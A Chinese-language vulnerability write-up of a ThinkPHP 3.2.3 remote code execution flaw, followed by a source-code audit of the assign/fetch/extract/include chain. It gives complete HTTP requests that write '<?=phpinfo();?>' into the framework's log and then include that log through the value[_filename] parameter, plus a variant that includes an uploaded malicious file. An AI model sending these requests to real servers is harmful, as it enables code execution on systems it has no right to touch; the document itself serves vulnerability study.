# ThinkPHP3.2.x RCE

Author: H3rmeks1t

Data: 2021.08.03

# 初始配置

- 这里利用`ThinkPHP3.2.3`做示例，[戳此进行下载](http://www.thinkphp.cn/donate/download/id/610.html)
- 下载后的源码中，需要对`Application/Home/Controller/IndexController.class.php`内容进行修改

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index($value=''){
        $this->assign($value);
        $this->show('<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style="padding: 24px 48px;"<h1>:)</h1><p>欢迎使用 <b>ThinkPHP</b>！</p><br/>版本 V{$Think.version}</div><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_55e75dfae343f5a1"></thinkad><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script>','utf-8');
    }
}
```

# 漏洞利用

利用`burpsuite`进行抓包修改包避免编码问题造成漏洞无法利用
## debug模式开启
![在这里插入图片描述](https://img-blog.csdnimg.cn/9ccfc8bf31894e5ea1fb2c25f0671884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
先用`Thinkphp Getshell`工具检测一下漏洞是否存在

![在这里插入图片描述](https://img-blog.csdnimg.cn/54093f5756724618af86ca6f9d03bce5.png#pic_center)

请求数据包，查看日志文件`Application/Runtime/Logs/Home/21_08_02.log`发现成功写入

```bas
GET /cms/index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?HTTP/1.1
Host: 192.168.10.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=rfpmtb683svnoh5emql41ka803
Connection: close
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b61d85c51d7841ef8373e48930deedd3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

构造攻击请求，成功触发该漏洞

```bash
GET /cms/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/21_08_02.log HTTP/1.1
Host: 192.168.10.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=rfpmtb683svnoh5emql41ka803
Connection: close
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/7fe012fbd2b24bdda423c12367dff181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## debug模式未开启
![在这里插入图片描述](https://img-blog.csdnimg.cn/e5674e7a7dde47268f902c9e7b5fbe56.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
请求数据包

```bas
GET /cms/index.php?m=--><?=phpinfo();?HTTP/1.1
Host: 192.168.10.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=rfpmtb683svnoh5emql41ka803
Connection: close
```
构造攻击请求，成功触发该漏洞

```bash
GET /cms/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_08_02.log HTTP/1.1
Host: 192.168.10.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=rfpmtb683svnoh5emql41ka803
Connection: close
```
## 文件包含\上传

上传具有恶意代码的任何文件到服务器上，直接包含其文件相对或绝对路径即可

```bas
http://192.168.10.9/cms/index.php?m=Home&c=Index&a=index&value[_filename]=./phpinfo.php
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/51be7c7e3e3c4f1383e29e90e06eaed0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# 漏洞分析
## 程序执行流程

![在这里插入图片描述](https://img-blog.csdnimg.cn/51780ca4fe034ff29a0dac5767cb211f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## 漏洞利用原理
在ThinkPHP3.2.3框架的程序中，如果要在模板中输出变量，需要在控制器中把变量传递给模板，系统提供了assign方法对模板变量赋值，本漏洞的利用条件为assign方法的第一个变量可控

## 本地代码审计

先跟进`Application/Home/Controller/IndexController.class.php`，功能代码中的`assign`方法中第一个变量为可控变量

![在这里插入图片描述](https://img-blog.csdnimg.cn/a6b90b743ff3481eb416b67bb8b6d1d2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

全局搜索`assign`，跟进`ThinkPHP/Library/Think/View.class.php`，可控变量进入assign方法赋值给`$this→tVar`变量

![在这里插入图片描述](https://img-blog.csdnimg.cn/f99d82bcab6448bc8a08aa9bced950fb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

进入`show`方法，跟进`ThinkPHP/Library/Think/Controller.class.php`，发现进一步调用了`display`方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/476e0743b5b0469aa8ede3707a6db219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

全局搜索`display`方法，跟进`ThinkPHP/Library/Think/View.class.php`，`display`方法开始解析并获取模板文件内容，此时模板文件路径和内容为空

![在这里插入图片描述](https://img-blog.csdnimg.cn/fc484aabf963478295ae912b17c488d5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

进入`fetch`方法，传入的参数为空时会根据配置获取默认的模板文件位置 `(./Application/Home/View/Index/index.html)`，之后系统配置的默认模板引擎为think，所以会进入else分支，获取`$this→tVar`变量值赋值给`$params`，之后进入`Hook::listen`方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/0bed374945df474cbf3d96f8f80bbe47.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

进入`listen`方法，跟进`ThinkPHP/Library/Think/Hook.class.php`，进入`exec`方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/8256f4599af14d469e0766fb2485cce8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

进入`exec`方法中，处理后调用`Behavior\ParseTemplateBehavior`类中的`run`方法处理`$params`这个带有日志文件路径的值

![在这里插入图片描述](https://img-blog.csdnimg.cn/6f2307b1caea4859a2771302e119c93e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

进入`run`方法，跟进`ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php`，进入else分支调用`Think\Template`类中的`fetch`方法对变量`$_data`进行处理

![在这里插入图片描述](https://img-blog.csdnimg.cn/1be04e3cc0a541178ea7097830e9e6fa.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进`ThinkPHP/Library/Think/Template.class.php`，获取缓存文件路径后进入Storage的`load`方法中

![在这里插入图片描述](https://img-blog.csdnimg.cn/c6b56074d1cb48beb24cd4860394b0bd.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进到`ThinkPHP/Library/Think/Storage/Driver/File.class.php`的`load`方法中，`$_filename`为之前获取的缓存文件路径，`$vars`则为之前带有_filename=日志文件路径的数组，`$vars`不为空则使用`extract`方法的EXTR_OVERWRITE默认描述对变量值进行覆盖，之后include该日志文件路径，导致文件包含，触发`ThinkPHP 3.x Log RCE`漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/36cd17cc3e7f43f495d10471492d1cd6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 漏洞通报

[戳此查看漏洞通报](https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ)